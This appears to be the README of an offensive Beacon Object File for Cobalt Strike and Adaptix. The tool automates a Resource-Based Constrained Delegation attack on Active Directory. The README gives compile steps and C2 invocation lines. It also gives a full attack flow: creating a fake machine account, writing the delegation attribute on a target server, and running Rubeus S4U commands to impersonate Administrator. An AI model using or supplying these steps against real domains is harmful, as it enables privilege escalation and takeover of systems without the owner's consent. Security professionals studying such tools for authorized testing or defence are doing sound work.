# RBCD BOF

A Beacon Object File that automates **Resource-Based Constrained Delegation (RBCD)** setup entirely inside the beacon process – no PowerShell, no child processes, no `net.exe`.

The BOF:
1. Creates a new machine account in `CN=Computers` (or re-uses an existing one)
2. Queries the account's `objectSid`
3. Builds a security descriptor with `CCDCLCSWRPWPDTLOCRSDRCWDWO` rights using `ConvertStringSecurityDescriptorToSecurityDescriptorW`
4. Writes `msds-allowedtoactonbehalfofotheridentity` on the target computer object via ADSI
5. Reads back and verifies the attribute (prints as SDDL)
6. Outputs ready-to-run Rubeus commands for S4U2Self/S4U2Proxy

## Prerequisites

* The beacon is running as a user with rights to:
  * Create computer objects (or `ms-DS-MachineAccountQuota > 0` for regular users)
  * Write `msds-allowedtoactonbehalfofotheridentity` on the target computer (typically Domain Admins, or delegated write access)
* Domain environment: Windows Server 2012 R2 or later

## How to compile

1. Install **MinGW-w64** (including binutils and strip).
2. Enter the `SOURCE/` directory.
3. Run `make`.

```sh
cd BOF/RBCD/SOURCE
make
```

This produces `rbcd.x64.o` and `rbcd.x86.o` one directory up.

Alternatively, compile manually:

```sh
x86_64-w64-mingw32-gcc -masm=intel -c rbcd.c -o ../rbcd.x64.o
x86_64-w64-mingw32-strip --strip-unneeded ../rbcd.x64.o

i686-w64-mingw32-gcc -masm=intel -DWOW64 -fno-leading-underscore -c rbcd.c -o ../rbcd.x86.o
i686-w64-mingw32-strip --strip-unneeded ../rbcd.x86.o
```

## Usage (Adaptix / Cobalt Strike)

### Adaptix

Import `adaptix-ported-scripts/rbcd.axs` via the Adaptix script loader, then:

```
rbcd -computer FAKECOMPUTER -password Passw0rd! -target SQL01
```

Optional flags:

| Flag | Description |
|------|-------------|
| `-domain contoso.local` | Override domain FQDN (auto-detected by default) |
| `-existing` | Skip account creation; use FAKECOMPUTER$ as an existing account |

### Cobalt Strike (inline-execute)

```
inline-execute rbcd.x64.o wstr:FAKECOMPUTER wstr:Passw0rd! wstr:SQL01 wstr: int:0
```

## Example attack flow

```
# 1. Set up RBCD
rbcd -computer FAKECOMPUTER -password Passw0rd! -target SQL01

# 2. Compute AES256 hash (Rubeus command printed by the BOF – run locally):
Rubeus.exe hash /password:Passw0rd! /user:FAKECOMPUTER$ /domain:contoso.local \
    /salt:CONTOSO.LOCALhostfakecomputer.contoso.local

# 3. S4U (substitute the AES256 hash from step 2):
Rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<hash> /impersonateuser:Administrator \
    /msdsspn:cifs/sql01.contoso.local /nowrap

# 4. Pass the ticket and access the target
```

## Finding a target with write access

Before running the BOF, confirm which computer objects the current user can write `msds-allowedtoactonbehalfofotheridentity` on. The companion [ReconAD BOF](../ReconAD/) can enumerate ACLs in bulk.

## Notes

* The machine account is created in `CN=Computers`. If the domain requires accounts in a specific OU, create the account first and use `-existing`.
* The BOF looks for the target computer in `CN=Computers` and then `OU=Domain Controllers`. Computers in custom OUs must be specified as a full DN (`CN=SQL01,OU=Servers,DC=contoso,DC=local`).
* All ADSI operations use Kerberos signing and sealing (`ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION`).
* Tested on Windows Server 2016 and 2019 domain environments.

## Support

Compiled on macOS with MinGW-w64. Tested on Windows 10+ beacons against Windows Server 2016+ domain controllers.
